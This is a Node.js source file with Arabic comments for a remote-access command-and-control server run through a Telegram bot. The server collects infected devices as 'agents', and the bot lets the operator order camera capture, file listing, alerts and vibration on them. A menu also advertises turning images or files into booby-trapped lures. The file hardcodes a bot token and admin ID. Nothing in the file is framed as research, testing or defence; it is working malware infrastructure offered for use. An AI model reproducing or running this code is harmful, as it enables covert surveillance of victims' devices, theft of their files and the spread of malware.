const { Telegraf, Markup } = require('telegraf');
const net = require('net');

// --- إعدادات السيادة والمزامنة ---
const TOKEN = "7579044776:AAHmovdlHgnuife-wnFrmJqU_q1_OFQz97I";
const ADMIN_ID = 6654753506; 
const PORT = 10000;

let activeAgents = {}; 
const bot = new Telegraf(TOKEN);

// --- 1. خادم الاستقبال (C2 Server) ---
const server = net.createServer((socket) => {
    socket.setKeepAlive(true, 60000);
    
    socket.once('data', (data) => {
        try {
            const info = JSON.parse(data.toString());
            const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
            activeAgents[agentId] = { socket, info };

            // إشعار الجلسة الجديدة (صيغة بسيطة لعدم حدوث خطأ)
            bot.telegram.sendMessage(ADMIN_ID, 
                `✅ **اتصال جديد نشط!**\n\n` +
                `📱 الجهاز: ${info.hostname}\n` +
                `🖥️ النظام: ${info.platform}\n` +
                `🔋 البطارية: ${info.battery}%`, { parse_mode: 'Markdown' });
        } catch (e) { 
            console.log("Initial Connection without JSON info");
        }
    });

    socket.on('error', () => {});
    socket.on('close', () => {});
});

// تشغيل السيرفر على المنفذ المطلوب
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
});

// --- 2. لوحة التحكم (Commands) ---
bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ مختبر التحكم جاهز للعمل:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('📱 الأجهزة المتصلة', 'list_agents')],
            [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
        ])
    );
});

bot.action('list_agents', (ctx) => {
    const ids = Object.keys(activeAgents);
    if (ids.length === 0) return ctx.reply("❌ لا توجد أجهزة متصلة حالياً.");
    
    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id}`, `manage_${id}`)]);
    ctx.reply("🌐 الجلسات النشطة:", Markup.inlineKeyboard(buttons));
});

bot.action('payload_tools', (ctx) => {
    ctx.reply('🛠️ **أدوات التلغيم:**\nأرسل صورة أو ملف لتحويله إلى طعم ملغم (قيد التطوير في هذا الإصدار).');
});

bot.action(/^manage_/, (ctx) => {
    const id = ctx.match.input.split('_')[1];
    ctx.reply(`🎮 التحكم في ${id}:`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 تصوير', `cmd_${id}_cam`), Markup.button.callback('📳 اهتزاز', `cmd_${id}_vibrate`)],
            [Markup.button.callback('🔔 إشعار', `cmd_${id}_alert`), Markup.button.callback('📂 ملفات', `cmd_${id}_ls`)]
        ])
    );
});

bot.action(/^cmd_/, (ctx) => {
    const parts = ctx.match.input.split('_');
    const id = parts[1];
    const cmd = parts[2];
    
    if (activeAgents[id]) {
        activeAgents[id].socket.write(cmd);
        ctx.answerCbQuery(`🚀 تم إرسال أمر ${cmd}`);
    } else {
        ctx.reply("❌ انقطع اتصال الجهاز.");
    }
});

bot.catch((err) => {
    console.error('Telegraf error', err);
});

bot.launch().then(() => console.log("Bot Live!"));
